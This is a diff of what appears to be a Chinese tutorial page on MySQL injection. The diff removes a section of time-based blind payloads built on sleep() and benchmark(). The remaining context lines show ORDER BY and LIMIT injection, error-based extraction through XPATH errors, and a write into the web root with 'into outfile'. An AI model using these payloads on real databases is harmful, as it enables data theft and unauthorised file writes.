@@ -120,41 +120,7 @@
 
 <p>环境：MySQL 5.5.47</p>
 
-<h3 id="0x00-基于时间的注入payload">0x00 基于时间的注入payload</h3>
-
-<pre><code>mysql&gt; select if((select database()) like &quot;rte%&quot;,sleep(2),null);
-+---------------------------------------------------+
-| if((select database()) like &quot;rte%&quot;,sleep(2),null) |
-+---------------------------------------------------+
-|                                                 0 |
-+---------------------------------------------------+
-1 row in set (2.00 sec)
-
-mysql&gt; select if((select database())=&quot;rteaaa&quot;,sleep(2),666);
-+-----------------------------------------------+
-| if((select database())=&quot;rtest1&quot;,sleep(2),666) |
-+-----------------------------------------------+
-|                                           666 |
-+-----------------------------------------------+
-1 row in set (0.00 sec)
-
-mysql&gt; select if((select database())=&quot;rtest&quot;,sleep(2),666);
-+----------------------------------------------+
-| if((select database())=&quot;rtest&quot;,sleep(2),666) |
-+----------------------------------------------+
-|                                            0 |
-+----------------------------------------------+
-1 row in set (2.00 sec)
-</code></pre>
-
-<pre><code>mysql&gt; select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),false);
-Empty set (2.18 sec)
-
-mysql&gt; select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),false);
-Empty set (0.00 sec)
-</code></pre>
-
-<h3 id="0x01-注入点在order-by后面">0x01 注入点在Order by后面</h3>
+<h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面</h3>
 
 <pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
 Query OK, 1 row affected (0.01 sec)
@@ -189,7 +155,7 @@ mysql&gt; select name from msg where id&gt;1 order by (select case when(2&lt;1) 
 ERROR 1242 (21000): Subquery returns more than 1 row
 </code></pre>
 
-<h3 id="0x02-注入点在limit后面">0x02 注入点在limit后面</h3>
+<h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面</h3>
 
 <ul>
 <li>limit前面没有order by可以使用union、analyse()</li>
@@ -231,7 +197,7 @@ mysql&gt; select id,name,content from msg where id&gt;1 order by name limit 1,1 
 ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
 </code></pre>
 
-<h3 id="0x03-根据报错得到数据库名-表名-列名">0x03 根据报错得到数据库名、表名、列名</h3>
+<h3 id="0x02-根据报错得到数据库名-表名-列名">0x02 根据报错得到数据库名、表名、列名</h3>
 
 <pre><code>#得到数据库名为rtest
 mysql&gt; select id,name,content from msg where id=2-a();
@@ -256,7 +222,7 @@ mysql&gt; select id,name,content from msg where id=2 and (select * from(select *
 ERROR 1241 (21000): Operand should contain 1 column(s)
 </code></pre>
 
-<h3 id="0x04-mysql的隐式转换">0x04 MySQL的隐式转换</h3>
+<h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换</h3>
 
 <ul>
 <li><p>官方隐式转换规则</p>
